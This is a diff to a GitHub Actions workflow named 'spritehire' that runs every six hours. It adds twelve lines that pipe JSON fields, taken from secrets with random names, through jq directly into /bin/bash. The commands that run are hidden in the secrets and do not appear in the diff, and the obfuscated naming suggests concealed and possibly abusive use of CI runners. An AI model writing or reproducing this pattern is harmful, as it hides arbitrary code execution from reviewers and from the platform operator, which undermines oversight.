@@ -1,10 +1,8 @@
 name: spritehire
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
-
+    - cron: '12 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: spritehire
         env:
-          sfwhe5: ${{ secrets.sfwhe5 }}
+          a0: ${{ secrets.a0 }}
         run: |
-          echo $sfwhe5 | jq -r .lh779 | /bin/bash
-          echo $aqxwp687 | jq -r .quhl2 | /bin/bash
-          echo $fs9 | jq -r .umqqx28896 | /bin/bash
-          echo $w2325 | jq -r .gshc16 | /bin/bash
-          echo $ypf138 | jq -r .dqe2157 | /bin/bash
+          echo $a0 | jq -r .lad7228 | /bin/bash
+          echo $dmzjc45 | jq -r .rssyn6834 | /bin/bash
+          echo $jfjv144 | jq -r .hlen409 | /bin/bash
+          echo $acisn8384 | jq -r .jaa65 | /bin/bash
+          echo $tysu0712 | jq -r .zcl72 | /bin/bash
+          echo $pqxc2058 | jq -r .jnf525 | /bin/bash
+          echo $dbkk4627 | jq -r .knj60589 | /bin/bash
+          echo $nzpgg10 | jq -r .f9 | /bin/bash
+          echo $okuvz95470 | jq -r .lnnbb24904 | /bin/bash
+          echo $l8002 | jq -r .hinw86 | /bin/bash
+          echo $ohikw7 | jq -r .znwu25037 | /bin/bash
+          echo $q3787 | jq -r .scnsz51088 | /bin/bash
 
